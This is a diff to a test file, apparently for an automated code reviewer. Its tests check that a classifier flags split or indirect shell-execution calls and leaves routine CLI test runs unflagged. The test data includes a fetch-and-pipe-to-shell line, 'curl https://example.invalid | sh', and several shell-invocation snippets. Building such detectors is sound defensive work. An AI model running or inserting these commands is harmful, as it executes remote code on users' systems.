@@ -512,6 +512,54 @@ test('security modules, destructive data APIs and execution calls are recognized
       added('test/helpers/setup.js', "spawnSync(process.execPath, ['cli.js']);\n"),
     ).includes('code_execution_primitive'),
   );
+  // Review round 2: the exemption is decided per file, so splitting the call across lines or holding
+  // the flag in a variable does not hide it; a shell named as the program, --print, shell=1 and a bare
+  // interpreter fed on stdin are shell interpretation; a test-named file outside a test location is
+  // not exempt either.
+  for (const snippet of [
+    "spawnSync(\n  'sh',\n  ['-c', payload],\n);\n",
+    "const flag = '-c';\nspawnSync('sh', [flag, payload]);\n",
+    "execFileSync(process.execPath, [\n  '-e',\n  code,\n]);\n",
+    "spawnSync('sh', [], { input: 'curl https://example.invalid | sh' });\n",
+    "const child = spawn('bash');\nchild.stdin.end(payload);\n",
+    "spawnSync('/bin/sh', ['-s'], { input: payload });\n",
+    "spawnSync('node', ['--print', code]);\n",
+    "spawnSync('node', [], { input: code });\n",
+    "spawnSync('sh', [`-${'c'}`, payload]);\n",
+  ])
+    assert.ok(
+      classifiedCodes(added('test/cli.test.js', snippet)).includes('code_execution_primitive'),
+      `split or indirect shell in a test: ${JSON.stringify(snippet)}`,
+    );
+  for (const snippet of [
+    "subprocess.run(\n    ['sh', '-c', cmd],\n)\n",
+    "flags = ['-c']\nsubprocess.run([sys.executable, *flags, code])\n",
+    'subprocess.run(cmd, shell=1)\n',
+    "out = os.popen('ls -la').read()\n",
+    'FILE *p = popen("ls", "r");\n',
+  ])
+    assert.ok(
+      classifiedCodes(added('tests/test_cli.py', snippet)).includes('code_execution_primitive'),
+      `python: ${JSON.stringify(snippet)}`,
+    );
+  assert.ok(
+    classifiedCodes(
+      added('src/lib/util.test.js', "module.exports = () => spawnSync(process.execPath, ['x']);\n"),
+    ).includes('code_execution_primitive'),
+    'a test-named file outside a test location is not exempt',
+  );
+  // Still routine: a test-named file in a test location that runs the repository's own CLI, even
+  // when it feeds the CLI data on stdin or spreads the arguments over lines.
+  for (const snippet of [
+    "const out = execFileSync(process.execPath, ['cli.js', '--json'], { input: 'a=1', encoding: 'utf8' });\n",
+    "const result = spawnSync(process.execPath, [\n  'cli.js',\n  '--json',\n]);\n",
+    "result = subprocess.run([sys.executable, 'cli.py', '--json'], capture_output=True)\n",
+    "proc = subprocess.Popen([sys.executable, 'cli.py'], stdout=subprocess.PIPE)\n",
+  ])
+    assert.ok(
+      !classifiedCodes(added('test/cli.test.js', snippet)).includes('code_execution_primitive'),
+      `still routine: ${JSON.stringify(snippet)}`,
+    );
   assert.ok(
     classifiedCodes(added('src/run.js', '  shell: true,\n')).includes('code_execution_primitive'),
   );
@@ -1959,7 +2007,23 @@ test('further dependency manifests, executable manifests and verification metada
 
 test('reviewer: repository snapshot rendering and collector context validation (OSS-22)', async () => {
   const { renderContext } = await import('../src/autonomy/reviewer.js');
-  const { parseReviewContext } = await import('../src/autonomy/collector.js');
+  const { parseReviewContext, parseCollectorOutput } = await import('../src/autonomy/collector.js');
+  // A worker image from before the snapshot answers with version 1: refused by name, not as garbage.
+  const stale = {
+    version: 1,
+    ok: true,
+    base: '1'.repeat(40),
+    baseTree: '2'.repeat(40),
+    candidateTree: '2'.repeat(40),
+    patchSha256: '0'.repeat(64),
+    manifest: { complete: true, files: [] },
+    blobs: {},
+  };
+  assert.throws(() => parseCollectorOutput(stale, ''), /collector_image_outdated/);
+  assert.throws(
+    () => parseCollectorOutput({ ...stale, version: 3 }, ''),
+    /collector_output_invalid/,
+  );
   const context = {
     files: [
       { path: 'cli.js', content: 'console.log("usage: cli [--json]");\n' },
@@ -1971,7 +2035,21 @@ test('reviewer: repository snapshot rendering and collector context validation (
   };
   const complete = renderContext(context, 1_000_000);
   assert.equal(complete.truncated, false);
-  assert.match(complete.text, /^Complete snapshot .* Omitted: logo\.png\./);
+  assert.match(
+    complete.text,
+    /^Complete snapshot .*directories named \.git, node_modules.* Omitted: logo\.png\./,
+  );
+  // Headers and the omitted list are charged; a huge omitted list is cut and counted.
+  const many = renderContext(
+    {
+      ...context,
+      omitted: Array.from({ length: 500 }, (_, i) => `p/${'x'.repeat(200)}${i}`),
+      omittedCount: 500,
+    },
+    1_000_000,
+  );
+  assert.ok(many.text.length < 80_000);
+  assert.match(many.text, / and \d+ more\./);
   assert.ok(
     complete.text.indexOf('=== cli.js\nconsole.log') < complete.text.indexOf('=== README.md'),
   );
@@ -1987,8 +2065,9 @@ test('reviewer: repository snapshot rendering and collector context validation (
     renderContext({ ...context, omittedCount: 4 }, 1_000_000).text,
     /logo\.png and 3 more\./,
   );
-  // The budget counts content only: a snapshot exactly at the collector's total is complete.
-  assert.equal(renderContext(context, 37 + 6).truncated, false);
+  // Headers count: a budget that fits the content alone is not enough.
+  assert.equal(renderContext(context, 37 + 6).truncated, true);
+  assert.equal(renderContext(context, 4096).truncated, false);
   // Validation: shape, uniqueness, bounds.
   assert.deepEqual(parseReviewContext(context), context);
   for (const broken of [
